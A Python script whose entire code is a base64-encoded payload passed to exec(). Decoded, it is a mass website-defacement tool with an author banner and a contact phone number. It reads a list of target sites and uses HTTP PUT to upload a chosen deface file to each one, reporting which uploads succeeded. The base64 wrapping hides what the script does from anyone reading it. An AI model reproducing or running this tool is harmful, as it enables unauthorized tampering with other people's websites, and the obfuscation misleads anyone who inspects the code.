import base64
exec(base64.b64decode('Iy0qLSBjb2Rpbmc6IHV0Zi04IC0qLQoKdHJ5OgogICBpbXBvcnQgcmVxdWVzdHMKICAgaW1wb3J0IG9zLnBhdGgKICAgaW1wb3J0IHN5cwpleGNlcHQgSW1wb3J0RXJyb3I6CiAgIGV4aXQoImluc3RhbGwgcmVxdWVzdHMgYW5kIHRyeSBhZ2FpbiAuLi4iKQpvcy5zeXN0ZW0oImNsZWFyIikKYmFubmVyID0gIiIiCj09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PQogX19fXyAgX19fX18gX19fXyAgX19fX18gX19fX19fICBfX19fX18gIF8gICAgIF9fXyBfX18gX19fX18KfCAgXyBcfCBfX19ffCAgXyBcfCBfX19fLyBfX19cIFwvIC8gIF8gXHwgfCAgIC8gXyBcXyBffF8gICBffAp8IHwgfCB8ICBffCB8IHxfKSB8ICBffCBcX19fICBcXCAgL3wgfF8pIHwgfCAgfCB8IHwgfCB8ICB8IHwKfCB8X3wgfCB8X19ffCAgX18vfCB8X19fIF9fXykgLyAgXHwgIF9fL3wgfF9ffCB8X3wgfCB8ICB8IHwKfF9fX18vfF9fX19ffF98ICAgfF9fX19ffF9fX18vXy9cX1xffCAgIHxfX19fX1xfX18vX19ffCB8X3wKOjo6Ojo6Ojo6Ojo6Ojo6Ojo6Ojo6W0FVVEhPUiBCWSAuL0NvbGVlOjo6Ojo6Ojo6Ojo6Ojo6Ojo6Ojo6OjoKSmFuZ2FuIFBydXN0YXN5OikKaW5nYXQgamlrYSBtYXNpaCBiaW5ndW5nIApodWJ1bmcgV2E6KzYyODM4NDI4NjIyNjkKIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjI+KVr++5j+KVsOKVreKIqeKVriMjIyMjIyMjIyMjIyMjIyMjIyMjIyMKIiIiCgpiID0gJ1wwMzNbMzFtJwpoID0gJ1wwMzNbMzJtJwptID0gJ1wwMzNbMDBtJwoKZGVmIHgodGV0ZXcpOgogICBpcHQgPSAnJwogICBpZiBzeXMudmVyc2lvbl9pbmZvLm1ham9yID4gMjoKICAgICAgaXB0ID0gaW5wdXQodGV0ZXcpCiAgIGVsc2U6CiAgICAgIGlwdCA9IHJhd19pbnB1dCh0ZXRldykKICAgCiAgIHJldHVybiBzdHIoaXB0KQoKZGVmIGFveChzY3JpcHQsdGFyZ2V0X2ZpbGU9InRhcmdldC50eHQiKToKICAgb3AgPSBvcGVuKHNjcmlwdCwiciIpLnJlYWQoKQogICB3aXRoIG9wZW4odGFyZ2V0X2ZpbGUsICJyIikgYXMgdGFyZ2V0OgogICAgICB0YXJnZXQgPSB0YXJnZXQucmVhZGxpbmVzKCkKICAgICAgcyA9IHJlcXVlc3RzLlNlc3Npb24oKQogICAgICBwcmludCgidXBsb2FkaW5nIGZpbGUgdG8gJWQgd2Vic2l0ZSIlKGxlbih0YXJnZXQpKSkKICAgICAgZm9yIHdlYiBpbiB0YXJnZXQ6CiAgICAgICAgIHRyeToKICAgICAgICAgICAgc2l0ZSA9IHdlYi5zdHJpcCgpCiAgICAgICAgICAgIGlmIHNpdGUuc3RhcnRzd2l0aCgiaHR0cDovLyIpIGlzIEZhbHNlOgogICAgICAgICAgICAgICBzaXRlID0gImh0dHA6Ly8iICsgc2l0ZQogICAgICAgICAgICByZXEgPSBzLnB1dChzaXRlKyIvIitzY3JpcHQsZGF0YT1vcCkKICAgICAgICAgICAgaWYgcmVxLnN0YXR1c19jb2RlIDwgMjAwIG9yIHJlcS5zdGF0dXNfY29kZSA+PSAyNTA6CiAgICAgICAgICAgICAgIHByaW50KG0rIlsiK2IrIkZBSUxFRCEiK20rIiBdICVzLyVzIiUoc2l0ZSxzY3JpcHQpKQogICAgICAgICAgICBlbHNlOgogICAgICAgICAgICAgICBwcmludChtKyJbIitoKyJTVUNDRVNTIittKyIgXSAlcy8lcyIlKHNpdGUsc2NyaXB0KSkKCiAgICAgICAgIGV4Y2VwdCByZXF1ZXN0cy5leGNlcHRpb25zLlJlcXVlc3RFeGNlcHRpb246CiAgICAgICAgICAgIGNvbnRpbnVlCiAgICAgICAgIGV4Y2VwdCBLZXlib2FyZEludGVycnVwdDoKICAgICAgICAgICAgcHJpbnQ7IGV4aXQoKQoKZGVmIG1haW4oX19ibl9fKToKICAgcHJpbnQoX19ibl9fKQogICB3aGlsZSBUcnVlOgogICAgICB0cnk6CiAgICAgICAgIGEgPSB4KCJTaWhsYWthbiBJc2kgTmFtYSBTYyBEZXBlcyBBbmRhITogIikKICAgICAgICAgaWYgbm90IG9zLnBhdGguaXNmaWxlKGEpOgogICAgICAgICAgICBwcmludCgiZmlsZSAnJXMnIG5vdCBmb3VuZCIlKGEpKQogICAgICAgICAgICBjb250aW51ZQogICAgICAgICBlbHNlOgogICAgICAgICAgICBicmVhawogICAgICBleGNlcHQgS2V5Ym9hcmRJbnRlcnJ1cHQ6CiAgICAgICAgIHByaW50OyBleGl0KCkKCiAgIGFveChhKQoKaWYgX19uYW1lX18gPT0gIl9fbWFpbl9fIjoKICAgIG1haW4oYmFubmVyKQo='))